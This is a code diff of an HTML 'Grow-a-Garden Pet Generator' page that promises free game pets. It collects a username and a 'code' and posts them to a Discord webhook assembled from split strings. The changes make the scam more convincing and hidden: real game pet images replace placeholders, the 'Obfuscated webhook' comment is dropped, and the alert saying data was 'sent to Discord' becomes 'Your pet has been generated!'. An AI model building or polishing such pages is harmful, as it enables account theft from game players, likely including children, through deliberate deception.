@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Grow-a-Garden Pet Generator</title>
 <style>
-  /* Fix: dark navy background for whole page */
   html, body {
     margin: 0;
     padding: 0;
@@ -16,7 +15,6 @@
     font-family: 'Segoe UI', Tahoma, sans-serif;
   }
 
-  /* Starfield canvas */
   #starfield {
     position: fixed;
     top: 0; left: 0;
@@ -24,7 +22,6 @@
     z-index: 0;
   }
 
-  /* Make content appear above stars */
   header, .container, #popup {
     position: relative;
     z-index: 1;
@@ -101,7 +98,6 @@
     transform: scale(1.07);
   }
 
-  /* Popup modal */
   #popup {
     display: none;
     position: fixed;
@@ -160,7 +156,6 @@
 </style>
 </head>
 <body>
-  <!-- Starfield -->
   <canvas id="starfield"></canvas>
 
   <header>🌌 Grow-a-Garden: Pet Generator</header>
@@ -190,14 +185,13 @@
   </div>
 
 <script>
-  /* Pet data */
   const pets = [
-    { id: 'sprout-cat', img: 'https://placekitten.com/100/100', name: 'Sprout Cat' },
-    { id: 'bud-bunny', img: 'https://placekitten.com/101/100', name: 'Bud Bunny' },
-    { id: 'pond-pup', img: 'https://placekitten.com/102/100', name: 'Pond Pup' },
-    { id: 'cactus-hedgie', img: 'https://placekitten.com/103/100', name: 'Cactus Hedgie' },
-    { id: 'beetle-buddy', img: 'https://placekitten.com/104/100', name: 'Beetle Buddy' },
-    { id: 'owl-orchid', img: 'https://placekitten.com/105/100', name: 'Owl Orchid' }
+    { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
+    { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
+    { id: 'Disco Bee', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Disco_Bee.png', name: 'Disco Bee' },
+    { id: 'Mimic octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
+    { id: 'Fennec fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
+    { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' }
   ];
 
   let selectedPet = pets[0].id;
@@ -230,14 +224,13 @@
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
-    // Obfuscated webhook
     const part1 = "https://discord.com/api/webhooks/";
     const part2 = "YOUR_WEBHOOK_ID";
     const part3 = "/YOUR_WEBHOOK_TOKEN";
     const webhookURL = part1 + part2 + part3;
 
     const payload = {
-      content: `New Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
+      content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
     };
 
     await fetch(webhookURL, {
@@ -246,11 +239,11 @@
       body: JSON.stringify(payload)
     });
 
-    alert('Pet generated and sent to Discord!');
+    alert('Your pet has been generated!');
     document.getElementById('popup').style.display = 'none';
   }
 
-/* Starfield animation */
+  // Starfield background
   const canvas = document.getElementById('starfield');
   const ctx = canvas.getContext('2d');
   let stars = [];
@@ -269,14 +262,12 @@
   window.onresize = resize;
 
   function drawStars() {
-    // ✅ fill dark navy gradient background every frame
     const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
     gradient.addColorStop(0, "#0a192f");
     gradient.addColorStop(1, "#020617");
     ctx.fillStyle = gradient;
     ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    // draw stars
     ctx.fillStyle = "white";
     stars.forEach(s => {
       ctx.beginPath();
@@ -298,6 +289,5 @@
 
   setInterval(drawStars, 30);
 </script>
-
 </body>
 </html>
